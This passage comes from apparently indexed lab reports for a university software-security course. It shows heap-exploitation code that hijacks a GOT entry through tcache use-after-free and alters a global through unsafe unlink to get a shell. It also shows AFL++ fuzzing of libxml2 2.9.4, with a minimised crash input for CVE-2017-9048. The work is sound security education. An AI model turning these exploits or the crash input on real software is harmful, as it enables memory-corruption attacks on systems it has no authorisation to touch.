<li>\u56de\u7b54\u5b9e\u9a8c\u5185\u5bb9\u4e2d\u63d0\u51fa\u7684\u95ee\u9898\uff0820 \u5206\uff09<ul> <li>\u5f00\u542f tcache \u548c\u4e0d\u5f00\u542f tcache \u521d\u59cb\u5806\u72b6\u6001\u6709\u4ec0\u4e48\u533a\u522b</li> <li>\u5f00\u542f tcache \u548c\u4e0d\u5f00\u542f tcache \u5728 checkpoint-3 \u65f6 free \u540e\u5b58\u5728\u7684\u533a\u522b</li> <li>checkpoint-4 \u65f6\u62ff\u5230\u7684 chunk \u662f\u4e4b\u524d\u54ea\u6761\u8bed\u53e5\u91ca\u653e\u7684\uff0c\u6709\u65e0 tcache \u73b0\u8c61\u662f\u5426\u4e0d\u4e00\u6837?</li> <li>checkpoint-7 \u65f6\u88ab\u91ca\u653e\u7684 a[0], a[1] \u662f\u600e\u6837\u7ec4\u7ec7\u7684\uff0c\u6709\u65e0 tcache \u73b0\u8c61\u662f\u5426\u4e0d\u4e00\u6837?</li> </ul> </li> </ul> </li> <li>Challenge 2. uaf\uff0860 \u5206\uff09<ul> <li>\u5728\u5b9e\u9a8c\u62a5\u544a\u4e2d\u63d0\u4f9b\u622a\u56fe\u548c\u653b\u51fb\u4ee3\u7801\u8bc1\u660e\u5b8c\u6210\u5982\u4e0b\u76ee\u6807</li> <li>\u6210\u529f\u6309\u6b65\u9aa4\u5b8c\u6210\u540e\u95e8\u8c03\u7528\uff0c\u6b65\u9aa4\u5206\uff0820+20+10+10\u5206\uff09</li> </ul> </li> <li>Bonus: unsafe unlink\uff0840 \u5206\uff09<ul> <li>\u5728\u5b9e\u9a8c\u62a5\u544a\u4e2d\u63d0\u4f9b\u622a\u56fe\u548c\u653b\u51fb\u4ee3\u7801\u8bc1\u660e\u5b8c\u6210\u5982\u4e0b\u76ee\u6807</li> <li>\u6210\u529f\u6309\u6b65\u9aa4\u5b8c\u6210\u5168\u5c40\u53d8\u91cf\u4fee\u6539\u548c shell \u5f39\u51fa\uff0c\u6b65\u9aa4\u5206\uff0810+10+10+10\u5206\uff09</li> </ul> </li> </ul>"},{"location":"sec/softsec/lab2/#challenge-test","title":"Challenge: test","text":""},{"location":"sec/softsec/lab2/#tcache","title":"\u5f00\u542f tcache","text":"<p>checkpoint 0\uff0c\u521d\u59cb\u72b6\u6001\uff0c\u5206\u914d\u4e86\u4e24\u4e2a chunk\uff08\u6700\u9876\u4e0a\u6709\u4e00\u4e2a\u521d\u59cb 0x251 \u7684 chunk\uff09\uff1a</p> <p>checkpoint 1 2 \u90fd\u662f malloc\uff0c\u6ca1\u4ec0\u4e48\u5927\u95ee\u9898\uff0c\u4e0d\u653e\u622a\u56fe\u4e86\u3002checkpoint 3\uff0cfree \u4e86\u56db\u4e2a chunk\uff0c\u8fdb\u5165\u4e86 tcache\uff1a</p> <p>checkpoint 4\uff0c\u91cd\u65b0\u5206\u914d\u4e86\u4e00\u4e2a 0x10 \u5927\u5c0f\u7684 chunk\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a chunk \u662f\u4ece tcachebins \u53d6\u51fa\u6765\u7684\uff1a</p> <p>checkpoint 5\uff0cfree \u4e86\u4e24\u4e2a chunk \u8fdb\u5165 tcache\u3002checkpoint 6\uff0cmalloc \u4e09\u4e2a 0x500 \u7684 chunk\u3002checkpoint 7\uff0cfree \u4e86\u524d\u4e24\u4e2a\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e24\u4e2a\u8fdb\u5165\u4e86 unsorted bin\uff0c\u5e76\u4e14\u88ab\u5408\u5e76\u4e86\uff1a</p>"},{"location":"sec/softsec/lab2/#tcache_1","title":"\u672a\u5f00\u542f tcache","text":"<p>checkpoint 0\uff0c\u521d\u59cb\u72b6\u6001\uff08\u9664\u4e86 top chunk \u4ee5\u5916\u53ea\u6709\u5206\u914d\u7684\u4e24\u4e2a chunk\uff09\uff1a</p> <p>checkpoint 3\uff0cfree \u4e86\u56db\u4e2a chunk\uff0c\u8fdb\u5165\u4e86 fast bin\uff1a</p> <p>checkpoint 4 \u4ece fast bin \u4e2d\u53d6\u4e00\u4e2a chunk\uff0ccheckpoint 5 \u53c8 free \u4e86\u4e24\u4e2a chunk \u8fdb\u5165 fast bin\uff1a</p> <p>\u4e4b\u540e\u6709\u4e00\u53e5 free(protect)\uff0c\u8fd9\u91cc\u53d8\u5316\u8f83\u5927\uff0c\u7531\u4e8e protect \u662f\u6700\u65b0\u4e00\u4e2a chunk\uff0c\u7d27\u63a5\u7740 top chunk\uff0c\u6240\u4ee5\u5b83\u88ab free \u4e86\u4e4b\u540e\u8fde\u540c\u7740\u9644\u8fd1 unused \u7684 chunk \u4e00\u8d77\u5408\u5e76\u5230\u4e86 top chunk \u4e2d\uff0c\u6700\u5916\u9762\u7684\u51e0\u4e2a fastbin \u5806\u5757\u4e5f\u5408\u5e76\u5230\u4e86\u4e00\u8d77\uff1a</p> <p>\u63a5\u7740\u5230\u8fbe checkpoint 6\uff0cmalloc \u4e09\u4e2a chunk\u3002checkpoint 7\uff0c\u540c\u6837\u91ca\u653e\u5230 unsorted bin\uff0c\u7136\u540e\u88ab\u5408\u5e76\uff1a</p>"},{"location":"sec/softsec/lab2/#_3","title":"\u95ee\u9898\u56de\u7b54","text":"<ul> <li>\u5f00\u542f tcache \u548c\u4e0d\u5f00\u542f tcache \u521d\u59cb\u5806\u72b6\u6001\u6709\u4ec0\u4e48\u533a\u522b<ul> <li>\u5f00\u542f tcache \u65f6\uff0c\u521d\u59cb\u5806\u6700\u5916\u4fa7\u4f1a\u6709\u4e00\u4e2a 0x251 \u5927\u5c0f\u7684 chunk</li> <li>\u4e0d\u5f00\u542f tcache \u65f6\uff0c\u521d\u59cb\u5806\u53ea\u6709 top chunk</li> </ul> </li> <li>\u5f00\u542f tcache \u548c\u4e0d\u5f00\u542f tcache \u5728 checkpoint-3 \u65f6 free \u540e\u5b58\u5728\u7684\u533a\u522b<ul> <li>\u5f00\u542f tcache \u65f6\uff0cfree \u7684 chunk \u4f1a\u8fdb\u5165 tcache</li> <li>\u4e0d\u5f00\u542f tcache \u65f6\uff0cfree \u7684 chunk \u4f1a\u8fdb\u5165 fast bin</li> </ul> </li> <li>checkpoint-4 \u65f6\u62ff\u5230\u7684 chunk \u662f\u4e4b\u524d\u54ea\u6761\u8bed\u53e5\u91ca\u653e\u7684\uff0c\u6709\u65e0 tcache \u73b0\u8c61\u662f\u5426\u4e0d\u4e00\u6837?<ul> <li>\u90fd\u662f\u4e4b\u524d free(b[1]) \u91ca\u653e\u7684</li> <li>\u6709\u65e0 tcache \u73b0\u8c61\u4e00\u6837\uff0c\u53ea\u662f\u4e00\u4e2a\u4ece tcache \u53d6\u8fd9\u4e2a chunk\uff0c\u4e00\u4e2a\u4ece fast bin \u53d6\u8fd9\u4e2a chunk</li> </ul> </li> <li>checkpoint-7 \u65f6\u88ab\u91ca\u653e\u7684 a[0], a[1] \u662f\u600e\u6837\u7ec4\u7ec7\u7684\uff0c\u6709\u65e0 tcache \u73b0\u8c61\u662f\u5426\u4e0d\u4e00\u6837?<ul> <li>\u90fd\u662f\u88ab\u91ca\u653e\u5230 unsorted bin\uff0c\u7136\u540e\u88ab\u5408\u5e76\u5230\u4e00\u8d77</li> <li>\u6709\u65e0 tcache \u73b0\u8c61\u5b8c\u5168\u4e00\u6837</li> </ul> </li> </ul>"},{"location":"sec/softsec/lab2/#challenge-uaf","title":"Challenge: uaf","text":"<p>\u76ee\u7684\u662f\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\uff0c\u4ece\u800c\u52ab\u6301 exit \u7684 GOT \u8868\uff0c\u4f7f\u4e4b\u8df3\u8f6c\u5230 backdoor \u4f4d\u7f6e\u3002</p> <p>\u5206\u6790\u7a0b\u5e8f\uff0cadd \u8d1f\u8d23\u8c03\u7528 malloc \u5e76\u5c06\u5730\u5740\u8bb0\u5f55\u5728 array \u4e2d\uff0cedit \u8d1f\u8d23\u4fee\u6539\u5806\u5757\u4e2d\u5185\u5bb9\uff0cfinish \u8d1f\u8d23\u8c03\u7528 free\uff0c\u800c free \u7684\u65f6\u5019\u4e0d\u4f1a\u5c06 array \u4e2d\u8bb0\u5f55\u7684\u5730\u5740\u7f6e NULL\uff0c\u6240\u4ee5\u5b58\u5728 UAF \u6f0f\u6d1e\u3002</p> <p>\u56e0\u6b64\u53ef\u4ee5\u5206\u914d\u4e09\u4e2a chunk (top-&gt;C-&gt;B-&gt;A)\uff0c\u7136\u540e\u91ca\u653e\u524d\u4e24\u4e2a\uff0c\u4f7f\u4e4b\u8fdb\u5165 tcache bin (tcache-&gt;B-&gt;A)\uff0c\u63a5\u4e0b\u6765\u5229\u7528 UAF \u4fee\u6539 B \u4e2d\u7684 fd\uff0c\u4f7f\u4e4b\u6307\u5411 exit \u7684 GOT\u3002\u7136\u540e malloc \u4f1a\u53d6\u56de B\uff0c\u5e76\u8ba9 tcache \u6307\u5411 B \u7684 fd\uff0c\u5373\u6211\u4eec\u8981\u5199\u5165\u7684\u5730\u5740\u3002\u8fd9\u6837\u63a5\u4e0b\u6765\u518d malloc \u5c31\u4f1a\u5c06\u5806\u5206\u914d\u5230\u6211\u4eec\u8981\u7684\u5730\u5740\u4e0a\uff0c\u5c06 backdoor \u5730\u5740\u5199\u5165\u5806\u5185\u5bb9\u5373\u53ef\u3002</p> <p>\u4ea4\u4e92\u7528\u51fd\u6570\uff1a</p> <pre><code>def add(time, content):\n    p.sendlineafter(b\"chocie:\\n\", b\"1\")\n    p.sendlineafter(b\"time\\n\", time)\n    p.sendlineafter(b\"content\\n\", content)\n\ndef edit(idx, time, content):\n    p.sendlineafter(b\"chocie:\\n\", b\"3\")\n    p.sendlineafter(b\"index\\n\", str(idx).encode())\n    p.sendlineafter(b\"time\\n\", time)\n    p.sendlineafter(b\"content\\n\", content)\n\ndef free(idx):\n    p.sendlineafter(b\"chocie:\\n\", b\"4\")\n    p.sendlineafter(b\"index\\n\", str(idx).encode())\n</code></pre> <ul> <li>\u5e03\u5c40\u5806\uff1a     <pre><code>add(b\"111\", b\"AAA\")\nadd(b\"222\", b\"BBB\")\nadd(b\"333\", b\"CCC\")\n\nfree(1)\nfree(2) # tcache -&gt; BBB -&gt; AAA\n</code></pre></li> <li>UAF \u4fee\u6539 BBB \u7684 fd\uff1a     <pre><code>edit(2, p64(elf.got[\"exit\"]), b\"DDD\")\n</code></pre></li> <li>\u5206\u914d\u51fa BBB\uff0c\u4f7f tcache \u6307\u5411 BBB \u7684 fd\uff1a     <pre><code>add(b\"444\", b\"EEE\") # tcache -&gt; exit@GOT\n</code></pre></li> <li>\u5206\u914d\u5230\u4efb\u610f\u5730\u5740\uff0c\u5199\u5165 backdoor \u5730\u5740\uff1a     <pre><code>add(p64(elf.symbols[\"backdoor\"]), b\"FFF\")\n</code></pre></li> <li>\u9000\u51fa\u7a0b\u5e8f\uff0c\u8fdb\u5165 backdoor\uff1a     <pre><code>p.sendlineafter(b\"chocie:\\n\", b\"5\")\np.interactive()\n</code></pre></li> </ul> <p>\u8fdc\u7a0b\u653b\u51fb\u622a\u56fe\uff1a</p> <p></p>"},{"location":"sec/softsec/lab2/#bonus-unsafe-unlink","title":"Bonus: unsafe unlink","text":"<p>\u9700\u8981\u5229\u7528 off-by-null \u6f0f\u6d1e\u7be1\u6539 chunk metadata\uff0c\u4f7f\u5f97\u5728 unlink \u7684\u65f6\u5019\u4fee\u6539\u4efb\u610f\u5730\u5740\u3002</p> <p>\u5177\u4f53\u4e00\u70b9\u5c31\u662f\u5206\u914d\u4e09\u4e2a\u5806\uff08top-&gt;C-&gt;B-&gt;A\uff09\uff0c\u56e0\u4e3a A \u5728\u4f4e\u5730\u5740\uff0c\u6240\u4ee5\u53ef\u4ee5\u6b63\u5e38\u8986\u76d6\u5230 B \u7684 prev_size \u90e8\u5206\uff0c\u56e0\u4e3a\u5b58\u5728 off-by-null \u6f0f\u6d1e\uff0c\u6240\u4ee5 B \u4e2d size \u7684\u672b\u5b57\u8282\u53ef\u4ee5\u88ab\u8986\u76d6\u4e3a 0\uff0c\u5bfc\u81f4 glibc \u8ba4\u4e3a\u6b64\u65f6 A \u5e76\u672a\u5728\u4f7f\u7528\u3002\u6240\u4ee5 free B \u7684\u65f6\u5019\u4f1a\u5408\u5e76 chunk\uff0c\u6b64\u65f6\u89e6\u53d1 unlink A\u3002unlink \u4ee3\u7801\uff1a</p> <pre><code>#define unlink(AV, P, BK, FD) {                                           \\\n    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))  \\\n      malloc_printerr (\"corrupted size vs. prev_size\");                   \\\n    FD = P-&gt;fd;                                                           \\\n    BK = P-&gt;bk;                                                           \\\n    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                 \\\n      malloc_printerr (\"corrupted double-linked list\");                   \\\n    else {                                                                \\\n        FD-&gt;bk = BK;                                                      \\\n        BK-&gt;fd = FD;                                                      \\\n        /* ... */                                                         \\\n      }                                                                   \\\n}\n</code></pre> <p>\u5229\u7528\u5176\u4e2d\u7684 FD-&gt;bk = BK\u3001BK-&gt;fd = FD\uff0c\u6b64\u65f6 P \u5373\u4e3a A \u504f\u79fb 0x10 \u7684 fake chunk\uff0c\u5176 fd bk \u6211\u4eec\u90fd\u53ef\u63a7\u3002\u800c -&gt;bk \u548c -&gt;fd \u76f8\u5f53\u4e8e\u5411\u540e\u504f\u79fb 0x10 \u548c 0x18 \u5b57\u8282\uff0c\u6240\u4ee5\u7406\u8bba\u4e0a\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u3002</p> <p>\u6839\u636e\u5b9e\u9a8c\u6307\u5bfc\u4ee5\u53ca\u4e0a\u9762\u7684\u4ee3\u7801\uff0c\u53ef\u4ee5\u53d1\u73b0\u6709\u4e24\u4e2a glibc \u7684\u68c0\u6d4b\u9700\u8981\u7ed5\u8fc7\uff1a</p> <ul> <li>chunksize(P) != prev_size (next_chunk(P))<ul> <li>\u53ea\u9700\u8981\u540c\u65f6\u5e03\u5c40\u597d fake chunk \u7684 chunksize \u5373\u53ef</li> </ul> </li> <li>FD-&gt;bk != P || BK-&gt;fd != P<ul> <li>\u9700\u8981\u4f7f\u5f97 FD-&gt;bk == BK-&gt;fd == P\uff0c\u5373\u80fd\u591f\u6307\u56de\u6765</li> <li>\u53ef\u4ee5\u5229\u7528 array[0]\uff0c\u5b83\u6307\u5411\u7684\u4f4d\u7f6e\u5c31\u662f chunk 0 \u7684\u5185\u5bb9\uff0c\u5373 fake chunk \u5f00\u5934</li> <li>\u5177\u4f53\u89c1\u4e0b\u56fe</li> </ul> </li> </ul> <p></p> <p>\u6839\u636e\u5de6\u56fe\u7684\u7ea2\u8272\u90e8\u5206\u586b\u5199 chunk 0 \u5185\u5bb9\u5373\u53ef\u4f2a\u9020 fake chunk\u3002\u5176 fd \u548c bk \u7684\u8bbe\u7f6e\u4e5f\u5728\u56fe\u4e2d\uff0c\u6839\u636e\u84dd\u8272\u7bad\u5934\uff0c\u53ef\u4ee5\u53d1\u73b0 P-&gt;bk-&gt;fd P-&gt;fd-&gt;bk \u90fd\u53ef\u4ee5\u6307\u56de P\uff0c\u4ee5\u7ed5\u8fc7\u68c0\u6d4b\u3002</p> <p>\u7136\u540e\u5728 unlink \u65f6\uff0cFD-&gt;bk = BK \u4f1a\u88ab\u8986\u76d6\uff0c\u6709\u7528\u7684\u662f BK-&gt;fd = FD \u4e00\u53e5\uff0c\u6548\u679c\u89c1\u4e0a\u53f3\u56fe\u3002unlink \u4e4b\u540e array[0] \u7684\u4f4d\u7f6e\u5199\u5165\u4e86 FD\u3002\u4e8e\u662f\u4fee\u6539 array[0] \u6307\u5411\u7684\u5185\u5bb9\u5373\u4fee\u6539\u6808\u4e0a FD \u5f00\u59cb\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u518d\u6b21\u8986\u76d6\u5230 array[0]\uff0c\u4f7f\u4e4b\u6307\u5411 privilegeToken \u4f4d\u7f6e\u3002\u4e4b\u540e\u518d\u6b21\u4fee\u6539 array[0] \u5185\u5bb9\u5373\u53ef\u4fee\u6539 privilegeToken\u3002</p> <p>\u4ea4\u4e92\u7528\u51fd\u6570\uff1a</p> <pre><code>def add(time, content):\n    p.sendlineafter(b\"chocie:\\n\", b\"1\")\n    p.sendlineafter(b\"time\\n\", time)\n    p.sendlineafter(b\"content\\n\", content)\n\ndef edit(idx, time, content):\n    p.sendlineafter(b\"chocie:\\n\", b\"3\")\n    p.sendlineafter(b\"index\\n\", str(idx).encode())\n    p.sendlineafter(b\"time\\n\", time)\n    p.sendlineafter(b\"content\\n\", content)\n\ndef free(idx):\n    p.sendlineafter(b\"chocie:\\n\", b\"4\")\n    p.sendlineafter(b\"index\\n\", str(idx).encode())\n</code></pre> <ul> <li>\u5206\u914d\u4e09\u4e2a chunk (top-&gt;C-&gt;B-&gt;A)\uff1a     <pre><code>add(b\"111\", b\"AAA\")\nadd(b\"222\", b\"BBB\")\nadd(b\"333\", b\"CCC\")\n</code></pre></li> <li>\u4fee\u6539\u6700\u9876\u5c42\u7684\u5806 A\uff0coff-by-null \u6ea2\u51fa\u5230 B \u7684 PREV_INUSE\uff0c\u6784\u9020\u4e00\u4e2a\u5df2\u7ecf free \u7684 fake chunk\uff1a     <pre><code>edit(\n    1,\n    p64(0) + p64(0x6f0) +\n    p64(elf.symbols[\"array\"] - 24) + p64(elf.symbols[\"array\"] - 16)[:-1],\n    b\"\\x00\" * 0x6d0 + p64(0x6f0)\n)\n</code></pre><ul> <li>\u6ce8\u610f\u6240\u6709\u8bfb\u53d6\u90fd\u5b58\u5728 off-by-null \u6f0f\u6d1e\uff0c\u6240\u4ee5\u521a\u597d\u5361\u5230\u5927\u5c0f\u7684\u8981\u622a\u65ad\u4e00\u4e2a\u5b57\u8282</li> </ul> </li> <li>free B\uff0c\u89e6\u53d1 unlink A\uff1a     <pre><code>free(2)\n</code></pre></li> <li>\u5728\u6808\u4e0a\u4e24\u6b21\u4fee\u6539 array[0]\uff0c\u5199\u5165 privilegeToken\uff1a     <pre><code>edit(1, p64(0) * 3 + p64(elf.symbols[\"privilegeToken\"])[:-1], b\"\\x00\")\nedit(1, p64(&lt;\u6570\u636e\u5220\u9664&gt;), \"\\x00\")\n</code></pre></li> </ul> <p>\u8fdc\u7a0b\u653b\u51fb\u622a\u56fe\uff1a</p> <p></p>"},{"location":"sec/softsec/lab3/","title":"\u52a8/\u9759\u6001\u5206\u6790","text":"<p> \u7ea6 1104 \u4e2a\u5b57  67 \u884c\u4ee3\u7801  4 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p> <p>Abstract</p> <p>\u8f6f\u4ef6\u5b89\u5168 lab3 \u5b9e\u9a8c\u62a5\u544a\uff082023.06.10 ~ 2023.07.02\uff09</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"sec/softsec/lab3/#_2","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>A\uff08\u52a8\u6001\u5206\u6790\uff09\uff1aFuzzing libxml2<ul> <li>\u642d\u5efa AFL++ \u73af\u5883\uff0c\u63d2\u6869\u7f16\u8bd1 libxml2 (v2.9.4) \u6e90\u7801\uff0830\u5206\uff09</li> <li>\u4f7f\u7528 AFL++ \u5bf9 libxml2 \u8fdb\u884c fuzzing\uff0c\u89e6\u53d1 crash\uff0840\u5206\uff09</li> <li>\u590d\u73b0 crash\uff0c\u7ed3\u5408 sanitizer \u4fe1\u606f\uff0c\u7406\u89e3\u7a0b\u5e8f\u4e3a\u4f55 crash\uff0c\u5e76\u5c1d\u8bd5\u4fee\u590d\uff0830\u5206\uff09</li> </ul> </li> <li>B\uff08\u9759\u6001\u5206\u6790\uff09\uff1aCodeQL 101\uff08\u6b64\u90e8\u5206\u5b9e\u9a8c\u5df2\u5220\u9664\uff09<ul> <li>\u5b8c\u6210 CodeQL \u73af\u5883\u642d\u5efa\uff0c\u5b8c\u6210\u7c7b\u793a\u4f8b\u4e2d\u7684\u6570\u636e\u5e93\u5efa\u7acb\u548c query\uff0840\u5206\uff09</li> <li>\u7f16\u5199\u9884\u671f\u7684\u68c0\u6d4b\u4ee3\u7801\uff0c\u5e76\u6210\u529f\u68c0\u6d4b\u5230 lab-01 \u4e2d demo.c \u548c echo.c \u4e2d\u7684 fsb \u6f0f\u6d1e\uff0830\u5206\uff09</li> <li>\u9605\u8bfb\u5b66\u4e60\u5df2\u6709\u7684 fsb \u68c0\u6d4b\u4ee3\u7801\uff0c\u7ed9\u51fa\u5bf9\u8be5\u4ee3\u7801\u7684\u5206\u6790\u4ee5\u53ca\u4e0e\u7b2c2\u6b65\u4e2d\u4ee3\u7801\u7684\u6bd4\u8f83\uff0830\u5206\uff09</li> </ul> </li> </ul>"},{"location":"sec/softsec/lab3/#a-fuzzing-libxml2","title":"\u52a8\u6001\u5206\u6790 (A): Fuzzing libxml2","text":""},{"location":"sec/softsec/lab3/#_3","title":"\u73af\u5883\u642d\u5efa\u4e0e\u63d2\u6869\u7f16\u8bd1","text":"<p>\u6839\u636e\u5b9e\u9a8c\u6307\u5bfc\u8fdb\u884c AFL++ \u7684\u7f16\u8bd1\u5b89\u88c5\uff1a</p> <ul> <li>\u5b89\u88c5\u4f9d\u8d56\uff1a<ul> <li>\u5b89\u88c5\u7cfb\u7edf\u4f9d\u8d56\uff1a     <pre><code>sudo apt install -y build-essential python3-dev flex bison libglib2.0-dev libpixman-1-dev python3-setuptools\n</code></pre></li> <li>\u5b89\u88c5 llvm-13 clang-13 \u5e76\u8bbe\u7f6e llvm-config     <pre><code>sudo apt install -y llvm-13 clang-13 llvm-13-dev\nsudo update-alternatives --install /usr/bin/llvm-config llvm-config /usr/bin/llvm-config-13 13\n</code></pre></li> <li>\u6d4b\u8bd5 llvm-config     <pre><code>llvm-config --version\n# \u8f93\u51fa 13.0.1\n</code></pre></li> </ul> </li> <li>\u4e0b\u8f7d AFL++ \u6e90\u7801     <pre><code>git clone https://github.com/AFLplusplus/AFLplusplus.git --depth 1\n</code></pre></li> <li>\u7f16\u8bd1 AFL++     <pre><code>cd AFLplusplus\nmake afl-fuzz\nmake afl-showmap\nmake llvm\n</code></pre></li> <li>\u8bbe\u7f6e PATH \u73af\u5883\u53d8\u91cf<ul> <li>\u5728 ~/.zshrc \u4e2d\u6dfb\u52a0 export PATH=/home/crane/mac/Desktop/ZJU/ssec/lab3/A/AFLplusplus:$PATH</li> </ul> </li> </ul> <p>\u7f16\u8bd1\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u5728 make llvm \u65f6\uff0c\u51fa\u73b0\u4e86\u62a5\u9519 fatal error: 'list' file not found\uff0c\u5373 #include &lt;list&gt; \u65f6\u6ca1\u6709\u627e\u5230 list\u3002\u4f46\u540e\u7eed\u4ecd\u53ef\u4ee5\u6b63\u5e38\u751f\u6210 afl-clang-fast \u7b49\u3002\u4f46\u5728\u7f16\u8bd1 libxml \u65f6 configure \u68c0\u6d4b\u4f1a\u62a5\u9519\uff0c\u65e0\u6cd5\u5229\u7528 afl-clang-fast \u7f16\u8bd1\uff0c\u67e5\u770b\u8be6\u7ec6\u4fe1\u606f\u662f\u56e0\u4e3a\u627e\u4e0d\u5230 SanitizerCoveragePCGUARD.so \u6587\u4ef6\uff0c\u518d\u67e5\u770b\u62a5\u9519\u4fe1\u606f\uff0cafl-llvm-common.o \u65e0\u6cd5\u7f16\u8bd1\uff0c\u5bf9\u5e94 Makefile \u91cc\u4f1a\u5bfc\u81f4\u4f9d\u8d56\u4e8e\u6b64\u7684 SanitizerCoveragePCGUARD.so \u4e5f\u65e0\u6cd5\u7f16\u8bd1\u3002 <p>\u52a0\u4e0a -v \u7f16\u8bd1\u4e00\u4e2a\u53ea\u6709 #include &lt;list&gt; \u7684\u6e90\u7801\u67e5\u770b\u8be6\u7ec6\u4fe1\u606f\uff0c\u770b\u5230 Selected GCC installation: /usr/lib/gcc/x86_64-linux-gnu/12\uff0c\u6240\u4ee5\u9700\u8981\u5b89\u88c5\u5bf9\u5e94\u7248\u672c\u7684 libstdc++-dev\uff0c\u5373 libstdc++-12-dev\u3002sudo apt install libstdc++-12-dev \u540e\u518d make llvm \u5373\u53ef\u89e3\u51b3\u3002</p> <p>\u63a5\u4e0b\u6765\u63d2\u6869\u7f16\u8bd1 libxml2 \u6ca1\u6709\u4ec0\u4e48\u95ee\u9898\uff0c\u76f4\u63a5\u6309\u7167\u6587\u6863\u5373\u53ef\uff1a</p> <pre><code>wget http://xmlsoft.org/download/libxml2-2.9.4.tar.gz\ntar -xf libxml2-2.9.4.tar.gz\ncd libxml2-2.9.4\nsudo apt install automake\nCC=afl-clang-fast CXX=afl-clang-fast++ ./configure --with-debug --disable-shared -without-ftp --without-http --without-legacy --without-python\nAFL_USE_ASAN=1 make -j `nproc`\n</code></pre> <p>\u7f16\u8bd1\u540e nm xmllint | grep __asan_report_error \u4e5f\u53ef\u4ee5\u770b\u5230\u76f8\u5e94\u7b26\u53f7\uff0c\u8bf4\u660e\u63d2\u6869\u6210\u529f\u3002</p>"},{"location":"sec/softsec/lab3/#fuzzing","title":"Fuzzing","text":"<p>\u6309\u7167\u6587\u6863\u6765\u5373\u53ef\uff1a</p> <pre><code>mkdir work\ncd work\nwget https://raw.githubusercontent.com/AFLplusplus/AFLplusplus/stable/dictionaries/xml.dict\ngit clone https://gitee.com/ret2happy/libxml2_sample.git corpus\nsudo bash -c \"echo core &gt;/proc/sys/kernel/core_pattern\"\nafl-fuzz -M master -m none -x xml.dict -i corpus -o output -- ../libxml2-2.9.4/xmllint --valid @@\n\n# in another terminal\nafl-fuzz -S slave1 -D -m none -x xml.dict -i corpus -o output -- ../libxml2-2.9.4/xmllint --valid @@\n</code></pre> <p>Fuzz \u534a\u5c0f\u65f6\u7684\u7ed3\u679c\uff1a</p> <p></p> <p>\u53ef\u4ee5\u53d1\u73b0\u51fa\u73b0\u4e86\u56db\u6b21 crash\uff0c\u8bb0\u5f55\u4e86\u5176\u4e2d\u7684\u4e24\u6b21\u3002</p>"},{"location":"sec/softsec/lab3/#crash","title":"Crash \u590d\u73b0\u4e0e\u4fee\u590d","text":""},{"location":"sec/softsec/lab3/#crash_1","title":"Crash \u590d\u73b0","text":"<p>\u4f7f\u7528\u4e24\u6b21\u7684 testcase \u5747\u80fd\u6210\u529f\u590d\u73b0\uff1a</p> <p> </p> <p>\u867d\u7136\u62a5\u9519\u6808\u6709\u7565\u5fae\u4e0d\u540c\uff0c\u4f46\u539f\u56e0\u90fd\u662f\u56e0\u4e3a xmlSnprintfElementContent \u4e2d\u53d1\u751f\u4e86\u6808\u6ea2\u51fa\uff0c\u90fd\u662f CVE-2017-9048 \u4e2d\u62a5\u7684\u7b2c\u4e00\u5904\u6f0f\u6d1e\u5f15\u8d77\u7684\u3002</p> <p>\u5bf9 testcase \u8fdb\u884c\u4e00\u4e9b\u7b80\u5316\uff0c\u5f97\u5230\u5982\u4e0b\u7684 testcase\uff08\u5176\u4e2d\u53cd\u5f15\u53f7\u6269\u8d77\u6765\u7684 A*8 \u8868\u793a\u6709\u516b\u4e2a A\uff09\uff1a</p> <pre><code>&lt;!DOCTYPE a [\n    &lt;!ELEMENT a (`A*8`:`A*4990`)&gt;\n]&gt;\n&lt;a/&gt;\n</code></pre> <p>\u53ef\u4ee5\u540c\u6837\u590d\u73b0 crash\u3002\u8fd9\u91cc\u7684\u8981\u6c42\u5c31\u662f : \u548c\u4e24\u4fa7\u5b57\u7b26\u52a0\u8d77\u6765 &gt;= 4998 \u4e2a\uff0c\u4e14\u4e0d\u80fd\u6709\u4e00\u4fa7\u7684\u8d85\u8fc7 4990 \u4e2a\u3002\u5982\u679c\u662f 4998 \u4e2a\u5c31\u4f1a\u5728 1323 \u884c crash\uff08\u540c\u7b2c\u4e00\u4e2a\u622a\u56fe\uff0c\u8fd9\u91cc\u662f\u5728\u672b\u5c3e\u6dfb\u52a0\u540e\u62ec\u53f7\uff09\uff0c\u5927\u4e8e 4998 \u7684\u8bdd\u5c31\u4f1a\u5728 1279 \u884c\u8c03\u7528\u7684 strcat \u4e2d crash\uff08\u540c\u7b2c\u4e8c\u4e2a\u622a\u56fe\uff09\u3002</p>"},{"location":"sec/softsec/lab3/#crash_2","title":"Crash \u539f\u56e0\u5206\u6790","text":"<p>valid.c \u4e2d xmlSnprintfElementContent \u51fd\u6570\u4f5c\u7528\u662f\u6253\u5370\u4e00\u4e2a element \u7684\u5185\u5bb9\uff0c\u5373\u5c06 content \u5199\u5165\u5927\u5c0f\u4e3a size \u7684 buf \u4e2d\uff0c\u5982\u679c englob \u4e3a 1 \u5219\u4f1a\u5728\u524d\u540e\u52a0\u4e0a\u62ec\u53f7\u3002</p> <pre><code>void\nxmlSnprintfElementContent(char *buf, int size, xmlElementContentPtr content, int englob) {\n    int len;\n\n    if (content == NULL) return;\n    len = strlen(buf);\n    if (size - len &lt; 50) {\n        if ((size - len &gt; 4) &amp;&amp; (buf[len - 1] != '.'))\n            strcat(buf, \" ...\");\n        return;\n    }\n    if (englob) strcat(buf, \"(\");\n    switch (content-&gt;type) {\n        case XML_ELEMENT_CONTENT_PCDATA:\n            ...\n        case XML_ELEMENT_CONTENT_ELEMENT:\n            if (content-&gt;prefix != NULL) {\n                if (size - len &lt; xmlStrlen(content-&gt;prefix) + 10) {\n                    strcat(buf, \" ...\");\n                    return;\n                }\n                strcat(buf, (char *) content-&gt;prefix);\n                strcat(buf, \":\");\n            }\n            